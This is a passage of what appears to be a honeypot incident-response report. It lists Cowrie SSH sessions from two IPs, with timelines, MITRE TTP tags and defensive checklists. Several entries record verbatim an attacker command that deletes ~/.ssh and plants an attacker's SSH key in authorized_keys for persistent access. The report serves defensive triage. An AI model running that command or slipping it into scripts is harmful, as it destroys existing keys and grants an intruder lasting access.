- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd5821df3b10

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:11 |
| **Last Seen** | 2026-04-26 04:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:11:49` | `cowrie.session.connect` |
| `2026-04-26 04:11:49` | `cowrie.client.version` |
| `2026-04-26 04:11:49` | `cowrie.client.kex` |
| `2026-04-26 04:11:49` | `cowrie.login.success` |
| `2026-04-26 04:11:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b28f4458678

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]228` |
| **First Seen** | 2026-04-26 04:12 |
| **Last Seen** | 2026-04-26 04:12 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:12:42` | `cowrie.session.connect` |
| `2026-04-26 04:12:42` | `cowrie.client.version` |
| `2026-04-26 04:12:42` | `cowrie.client.kex` |
| `2026-04-26 04:12:42` | `cowrie.login.success` |
| `2026-04-26 04:12:43` | `cowrie.session.params` |
| `2026-04-26 04:12:43` | `cowrie.command.input` |
| `2026-04-26 04:12:43` | `cowrie.command.failed` |
| `2026-04-26 04:12:43` | `cowrie.log.closed` |
| `2026-04-26 04:12:44` | `cowrie.session.params` |
| `2026-04-26 04:12:44` | `cowrie.command.input` |
| `2026-04-26 04:12:45` | `cowrie.session.file_download` |
| `2026-04-26 04:12:45` | `cowrie.log.closed` |
| `2026-04-26 04:12:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-463820ffc5e0

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]228` |
| **First Seen** | 2026-04-26 04:12 |
| **Last Seen** | 2026-04-26 04:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:12:52` | `cowrie.session.connect` |
| `2026-04-26 04:12:52` | `cowrie.client.version` |
| `2026-04-26 04:12:56` | `cowrie.client.kex` |
| `2026-04-26 04:12:56` | `cowrie.login.success` |
| `2026-04-26 04:12:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49c3cbcd6fd5

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:13 |
| **Last Seen** | 2026-04-26 04:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:13:09` | `cowrie.session.connect` |
| `2026-04-26 04:13:09` | `cowrie.client.version` |
| `2026-04-26 04:13:09` | `cowrie.client.kex` |
| `2026-04-26 04:13:09` | `cowrie.login.success` |
| `2026-04-26 04:13:09` | `cowrie.session.params` |
| `2026-04-26 04:13:09` | `cowrie.command.input` |
| `2026-04-26 04:13:09` | `cowrie.command.failed` |
| `2026-04-26 04:13:09` | `cowrie.log.closed` |
| `2026-04-26 04:13:10` | `cowrie.session.params` |
| `2026-04-26 04:13:10` | `cowrie.command.input` |
| `2026-04-26 04:13:10` | `cowrie.session.file_download` |
| `2026-04-26 04:13:10` | `cowrie.log.closed` |
| `2026-04-26 04:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d094ec3a516

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:13 |
| **Last Seen** | 2026-04-26 04:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:13:11` | `cowrie.session.connect` |
| `2026-04-26 04:13:11` | `cowrie.client.version` |
| `2026-04-26 04:13:11` | `cowrie.client.kex` |
| `2026-04-26 04:13:12` | `cowrie.login.success` |
| `2026-04-26 04:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-741e2e1f9d09

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]228` |
| **First Seen** | 2026-04-26 04:14 |
| **Last Seen** | 2026-04-26 04:15 |
| **Session Duration** | 75s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:14:18` | `cowrie.session.connect` |
| `2026-04-26 04:14:18` | `cowrie.client.version` |
| `2026-04-26 04:14:18` | `cowrie.client.kex` |
| `2026-04-26 04:14:23` | `cowrie.login.success` |
| `2026-04-26 04:15:33` | `cowrie.session.params` |
| `2026-04-26 04:15:33` | `cowrie.command.input` |
| `2026-04-26 04:15:33` | `cowrie.command.failed` |
| `2026-04-26 04:15:33` | `cowrie.log.closed` |
| `2026-04-26 04:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-949313c5fe81

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:14 |
| **Last Seen** | 2026-04-26 04:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:14:42` | `cowrie.session.connect` |
| `2026-04-26 04:14:42` | `cowrie.client.version` |
| `2026-04-26 04:14:42` | `cowrie.client.kex` |
| `2026-04-26 04:14:43` | `cowrie.login.success` |
| `2026-04-26 04:14:43` | `cowrie.session.params` |
| `2026-04-26 04:14:43` | `cowrie.command.input` |
| `2026-04-26 04:14:43` | `cowrie.command.failed` |
| `2026-04-26 04:14:43` | `cowrie.log.closed` |
| `2026-04-26 04:14:43` | `cowrie.session.params` |
| `2026-04-26 04:14:43` | `cowrie.command.input` |
| `2026-04-26 04:14:43` | `cowrie.session.file_download` |
| `2026-04-26 04:14:43` | `cowrie.log.closed` |
| `2026-04-26 04:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6155a792bb2

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:14 |
| **Last Seen** | 2026-04-26 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:14:45` | `cowrie.session.connect` |
| `2026-04-26 04:14:45` | `cowrie.client.version` |
| `2026-04-26 04:14:45` | `cowrie.client.kex` |
| `2026-04-26 04:14:45` | `cowrie.login.success` |
| `2026-04-26 04:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542a2c443bdc

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:16 |
| **Last Seen** | 2026-04-26 04:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:16:16` | `cowrie.session.connect` |
| `2026-04-26 04:16:16` | `cowrie.client.version` |
| `2026-04-26 04:16:17` | `cowrie.client.kex` |
| `2026-04-26 04:16:17` | `cowrie.login.success` |
| `2026-04-26 04:16:17` | `cowrie.session.params` |
| `2026-04-26 04:16:17` | `cowrie.command.input` |
| `2026-04-26 04:16:17` | `cowrie.command.failed` |
| `2026-04-26 04:16:17` | `cowrie.log.closed` |
| `2026-04-26 04:16:17` | `cowrie.session.params` |
| `2026-04-26 04:16:17` | `cowrie.command.input` |
| `2026-04-26 04:16:17` | `cowrie.session.file_download` |
| `2026-04-26 04:16:17` | `cowrie.log.closed` |
| `2026-04-26 04:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d2cb9a8d2a5

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:16 |
| **Last Seen** | 2026-04-26 04:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:16:19` | `cowrie.session.connect` |
| `2026-04-26 04:16:19` | `cowrie.client.version` |
| `2026-04-26 04:16:19` | `cowrie.client.kex` |
| `2026-04-26 04:16:20` | `cowrie.login.success` |
| `2026-04-26 04:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5becb8022e42

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:17 |
| **Last Seen** | 2026-04-26 04:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:17:45` | `cowrie.session.connect` |
| `2026-04-26 04:17:45` | `cowrie.client.version` |
| `2026-04-26 04:17:45` | `cowrie.client.kex` |
| `2026-04-26 04:17:46` | `cowrie.login.success` |
| `2026-04-26 04:17:46` | `cowrie.session.params` |
| `2026-04-26 04:17:46` | `cowrie.command.input` |
| `2026-04-26 04:17:46` | `cowrie.command.failed` |
| `2026-04-26 04:17:46` | `cowrie.log.closed` |
| `2026-04-26 04:17:46` | `cowrie.session.params` |
| `2026-04-26 04:17:46` | `cowrie.command.input` |
| `2026-04-26 04:17:46` | `cowrie.session.file_download` |
| `2026-04-26 04:17:46` | `cowrie.log.closed` |
| `2026-04-26 04:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9e8079d8afb

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:17 |
| **Last Seen** | 2026-04-26 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:17:48` | `cowrie.session.connect` |
| `2026-04-26 04:17:48` | `cowrie.client.version` |
| `2026-04-26 04:17:48` | `cowrie.client.kex` |
| `2026-04-26 04:17:48` | `cowrie.login.success` |
| `2026-04-26 04:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dbfcfe190b1

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:19 |
| **Last Seen** | 2026-04-26 04:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:19:19` | `cowrie.session.connect` |
| `2026-04-26 04:19:19` | `cowrie.client.version` |
| `2026-04-26 04:19:19` | `cowrie.client.kex` |
| `2026-04-26 04:19:19` | `cowrie.login.success` |
| `2026-04-26 04:19:19` | `cowrie.session.params` |
| `2026-04-26 04:19:19` | `cowrie.command.input` |
| `2026-04-26 04:19:19` | `cowrie.command.failed` |
| `2026-04-26 04:19:19` | `cowrie.log.closed` |
| `2026-04-26 04:19:20` | `cowrie.session.params` |
| `2026-04-26 04:19:20` | `cowrie.command.input` |
| `2026-04-26 04:19:20` | `cowrie.session.file_download` |
| `2026-04-26 04:19:20` | `cowrie.log.closed` |
| `2026-04-26 04:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f358415cfffc

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:19 |
| **Last Seen** | 2026-04-26 04:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:19:21` | `cowrie.session.connect` |
| `2026-04-26 04:19:21` | `cowrie.client.version` |
| `2026-04-26 04:19:21` | `cowrie.client.kex` |
| `2026-04-26 04:19:22` | `cowrie.login.success` |
| `2026-04-26 04:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2e751a780db

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]228` |
| **First Seen** | 2026-04-26 04:20 |
| **Last Seen** | 2026-04-26 04:20 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:20:38` | `cowrie.session.connect` |
| `2026-04-26 04:20:38` | `cowrie.client.version` |
| `2026-04-26 04:20:39` | `cowrie.client.kex` |
| `2026-04-26 04:20:41` | `cowrie.login.success` |
| `2026-04-26 04:20:41` | `cowrie.session.params` |
| `2026-04-26 04:20:41` | `cowrie.command.input` |
| `2026-04-26 04:20:41` | `cowrie.command.failed` |
| `2026-04-26 04:20:42` | `cowrie.log.closed` |
| `2026-04-26 04:20:42` | `cowrie.session.params` |
| `2026-04-26 04:20:42` | `cowrie.command.input` |
| `2026-04-26 04:20:42` | `cowrie.session.file_download` |
| `2026-04-26 04:20:42` | `cowrie.log.closed` |
| `2026-04-26 04:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22925f6510e9

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]228` |
| **First Seen** | 2026-04-26 04:20 |
| **Last Seen** | 2026-04-26 04:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:20:48` | `cowrie.session.connect` |
| `2026-04-26 04:20:48` | `cowrie.client.version` |
| `2026-04-26 04:20:48` | `cowrie.client.kex` |
| `2026-04-26 04:20:50` | `cowrie.login.success` |
| `2026-04-26 04:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]228` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa4742fc2f70

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:25 |
| **Last Seen** | 2026-04-26 04:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 04:25:04` | `cowrie.session.connect` |
| `2026-04-26 04:25:04` | `cowrie.client.version` |
| `2026-04-26 04:25:04` | `cowrie.client.kex` |
| `2026-04-26 04:25:04` | `cowrie.login.success` |
| `2026-04-26 04:25:04` | `cowrie.session.params` |
| `2026-04-26 04:25:04` | `cowrie.command.input` |
| `2026-04-26 04:25:04` | `cowrie.command.failed` |
| `2026-04-26 04:25:04` | `cowrie.log.closed` |
| `2026-04-26 04:25:05` | `cowrie.session.params` |
| `2026-04-26 04:25:05` | `cowrie.command.input` |
| `2026-04-26 04:25:05` | `cowrie.session.file_download` |
| `2026-04-26 04:25:05` | `cowrie.log.closed` |
| `2026-04-26 04:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.179.56[.]78` to AbuseIPDB if not already reported
- [ ] Block `103.179.56[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c459fc11ba80

| Field | Detail |
|---|---|
| **Source IP** | `103.179.56[.]78` |
| **First Seen** | 2026-04-26 04:25 |
| **Last Seen** | 2026-04-26 04:25 |
| **Session Duration** | 0s |
